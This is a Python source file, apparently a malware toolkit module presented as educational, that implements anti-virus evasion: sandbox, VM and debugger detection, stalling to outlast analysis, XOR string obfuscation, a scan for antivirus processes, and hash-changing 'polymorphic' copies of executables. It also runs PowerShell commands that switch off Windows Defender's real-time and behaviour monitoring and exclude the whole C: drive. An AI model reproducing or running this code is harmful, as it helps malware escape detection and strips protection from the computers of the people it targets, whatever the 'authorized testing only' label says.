"""
Anti-Virus Evasion Module
Educational implementation of AV evasion techniques
For cybersecurity education and authorized testing only
"""

import os
import sys
import time
import ctypes
import hashlib
import base64
from pathlib import Path


class AVEvasion:
    """
    Implements various AV evasion techniques
    Educational purpose: Demonstrates how malware evades detection
    """

    @staticmethod
    def check_sandbox():
        """
        Detect if running in sandbox/VM environment
        Returns: True if likely sandbox, False otherwise
        """
        indicators = 0

        # Check for common VM/sandbox artifacts
        if sys.platform == 'win32':
            try:
                # Check for VM-related files
                vm_files = [
                    r'C:\windows\System32\Drivers\Vmmouse.sys',
                    r'C:\windows\System32\Drivers\vmhgfs.sys',
                    r'C:\windows\System32\Drivers\VBoxMouse.sys',
                    r'C:\windows\System32\Drivers\VBoxGuest.sys',
                    r'C:\windows\System32\vboxdisp.dll',
                    r'C:\windows\System32\vboxhook.dll',
                ]

                for file in vm_files:
                    if os.path.exists(file):
                        indicators += 1

                # Check RAM (VMs usually have limited RAM)
                import psutil
                ram_gb = psutil.virtual_memory().total / (1024**3)
                if ram_gb < 4:  # Less than 4GB is suspicious
                    indicators += 1

                # Check number of processors
                if psutil.cpu_count() < 2:
                    indicators += 1

            except:
                pass

        return indicators >= 2

    @staticmethod
    def sleep_evasion(seconds=60):
        """
        Sleep to evade sandboxes (they have limited analysis time)
        Most sandboxes analyze for 30-60 seconds only
        """
        if AVEvasion.check_sandbox():
            # If we detect sandbox, sleep longer to timeout the analysis
            time.sleep(seconds)
            return True
        return False

    @staticmethod
    def check_debugger():
        """
        Check if a debugger is attached
        Returns: True if debugger detected
        """
        if sys.platform == 'win32':
            try:
                # Use Windows API to check for debugger
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except:
                pass
        return False

    @staticmethod
    def check_mouse_movement():
        """
        Check if mouse has moved (real user vs automated analysis)
        Sandboxes often don't simulate mouse movement
        """
        if sys.platform == 'win32':
            try:
                import win32api
                # Get initial position
                pos1 = win32api.GetCursorPos()
                time.sleep(5)
                # Get position after 5 seconds
                pos2 = win32api.GetCursorPos()

                # If mouse hasn't moved, might be sandbox
                return pos1 != pos2
            except:
                pass
        # Assume real user if we can't check
        return True

    @staticmethod
    def string_obfuscate(text):
        """
        Obfuscate strings to avoid signature detection
        """
        # Simple XOR obfuscation
        key = 0x42
        return ''.join(chr(ord(c) ^ key) for c in text)

    @staticmethod
    def string_deobfuscate(obfuscated):
        """
        Deobfuscate strings
        """
        key = 0x42
        return ''.join(chr(ord(c) ^ key) for c in obfuscated)

    @staticmethod
    def check_av_processes():
        """
        Check if AV processes are running
        Returns: List of detected AV processes
        """
        av_processes = []

        if sys.platform == 'win32':
            try:
                import psutil

                # Common AV process names
                av_names = [
                    'MsMpEng.exe',  # Windows Defender
                    'avp.exe',      # Kaspersky
                    'avgnt.exe',    # Avira
                    'avgsvc.exe',   # AVG
                    'bdagent.exe',  # Bitdefender
                    'egui.exe',     # ESET
                    'ekrn.exe',     # ESET
                    'msascuil.exe', # Windows Defender UI
                    'MpCmdRun.exe', # Windows Defender CMD
                ]

                for proc in psutil.process_iter(['name']):
                    try:
                        if proc.info['name'] in av_names:
                            av_processes.append(proc.info['name'])
                    except:
                        pass

            except:
                pass

        return av_processes

    @staticmethod
    def disable_defender():
        """
        EDUCATIONAL ONLY - Shows how malware tries to disable Defender
        NOTE: This will likely fail without admin rights
        Returns: Success status
        """
        if sys.platform != 'win32':
            return False

        try:
            # Try to disable Windows Defender Real-Time Protection
            # This requires admin rights and will likely be blocked
            commands = [
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
                'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
                'powershell -Command "Add-MpPreference -ExclusionPath \\"C:\\\\\\""',
            ]

            for cmd in commands:
                try:
                    os.system(cmd + ' 2>nul')
                except:
                    pass

            return True
        except:
            return False

    @staticmethod
    def add_defender_exclusion(path):
        """
        Try to add exclusion to Windows Defender
        Requires admin rights
        """
        if sys.platform != 'win32':
            return False

        try:
            cmd = f'powershell -Command "Add-MpPreference -ExclusionPath \\"{path}\\"" 2>nul'
            result = os.system(cmd)
            return result == 0
        except:
            return False

    @staticmethod
    def is_admin():
        """
        Check if running with administrator privileges
        """
        if sys.platform == 'win32':
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.geteuid() == 0

    @staticmethod
    def polymorphic_copy(source_path, target_path):
        """
        Create a polymorphic copy (changes file hash)
        Adds random data to change signature without breaking functionality
        """
        try:
            # Read original file
            with open(source_path, 'rb') as f:
                content = f.read()

            # Add random bytes at the end (in a way that doesn't affect execution)
            import random
            random_data = bytes([random.randint(0, 255) for _ in range(1024)])

            # For PE files, we can add data after the end without breaking them
            # Write modified file
            with open(target_path, 'wb') as f:
                f.write(content)
                f.write(random_data)

            return True
        except:
            return False

    @staticmethod
    def check_internet():
        """
        Check if internet is available
        Some sandboxes don't have internet
        """
        try:
            import socket
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            return False

    @staticmethod
    def comprehensive_check():
        """
        Comprehensive environment check
        Returns: (is_safe, reason)
        """
        # Check for debugger
        if AVEvasion.check_debugger():
            return False, "Debugger detected"

        # Check for sandbox
        if AVEvasion.check_sandbox():
            return False, "Sandbox detected"

        # Check internet (optional, can be too aggressive)
        # if not AVEvasion.check_internet():
        #     return False, "No internet connection"

        # All checks passed
        return True, "Environment appears safe"
